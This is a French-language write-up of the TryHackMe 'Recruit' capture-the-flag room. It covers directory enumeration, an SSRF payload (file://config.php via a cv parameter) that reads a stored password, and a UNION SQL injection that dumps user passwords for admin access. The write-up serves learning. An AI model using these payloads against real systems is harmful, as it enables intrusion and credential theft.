---
title: "TryHackMe - Recruit"
platform: "TryHackMe"
difficulty: "Medium"
tags: [web, ctf, ssrf, sqli]
---

## Résumé

Dans ce CTF notre objectif est de récupérer 2 flags affichés en clair sur le site web cible (recruit.thm) une fois connecté en tant que 'user' puis 'admin'.

## Techniques/Outils Utilisés

Reconnaissance :

- Gobuster

Accès Initial :
- SSRF

Elévation de privilèges :
-  SQL Injection

## Reconnaissance

On va se connecter sur le site web cible qui possède uniquement un formulaire de connexion ainsi qu'un lien vers api.php qui nous explique comment les endpoints fonctionne :

![Login Page](/assets/images/recruit-login.png)

En fouillant on peut voir qu'un endpoint '/file.php?cv=<URL>' est utilisé pour fetch les CV des candidats :

![API Endpoint Page](/assets/images/recruit-api.png)

Pour vérifier qu'il n'y aurait pas d'informations dissimulées dans de potentiels chemins et fichiers cachés on va effectuer une énumération sur le site cible : 

```bash
root@ip-10-130-111-32:~# gobuster dir -u http://10.130.129.31/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.129.31/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 313] [--> http://10.130.129.31/mail/]
/assets               (Status: 301) [Size: 315] [--> http://10.130.129.31/assets/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.130.129.31/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

Ici ce qui va nous intéresser va être le /mail qu'on va s'empresser d'aller voir :

![Mail Page](/assets/images/recruit-mail.png)

On y trouve un fichier de log qui nous indique que le nom d'utilisateur est 'hr' et que le mot de passe est stocké sur le fichier config.php.

## Exploitation initiale

La prochaine étape est de construire un payload SSRF pour aller chercher ce fameux fichier config.php en utilisant l'endpoint découvert précédemment :

```bash
http://10.130.129.31/file.php?cv=file://config.php
```

Bingo on peut lire le fichier et ainsi y lire le mot de passe stocké temporairement pour l'utilisateur 'hr' :

![Config Page](/assets/images/recruit-config.png)

On peut maintenant se connecter avec les informations récoltées précédemment et avoir accès au dashboard de l'utilisateur (ainsi qu'au premier flag du challenge) :

![Dashboard Page](/assets/images/recruit-dashboard.png)

## Élévation de privilèges

Sur ce dashboard la seule fonctionnalité est la recherche de nom de candidat, on va vérifier que l'injection SQL est possible en y insérant simplement le symbole ' pour vérifier si le site nous retourne une erreur :

![Dashboard Page](/assets/images/recruit-sqlerror.png)

Avec la confirmation on va constuire le payload qui va nous permettre de retourner le contenu de la base de données (je ne vais pas m'attarder dans ce write-up sur chaque étape pour trouver le nombre de colonnes dans la table ni trouver le nom de la table, ref: SQL Injection Introduction room sur TryHackMe) :

```bash
' UNION SELECT null,null,password,null FROM users -- -
```

![SQLI Page](/assets/images/recruit-sqli.png)

On va alors avoir en clair le serveur qui nous retourne la liste des mots de passe dans la base de données que l'on va alors utiliser pour se connecter en tant qu'admin sur la page de login :

![Admin Page](/assets/images/recruit-admin.png)

## Conclusion

Un CTF très fun pour comprendre les principes de vulnérabilité SSRF et d'injection SQL sur des exemples simples à comprendre. 

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
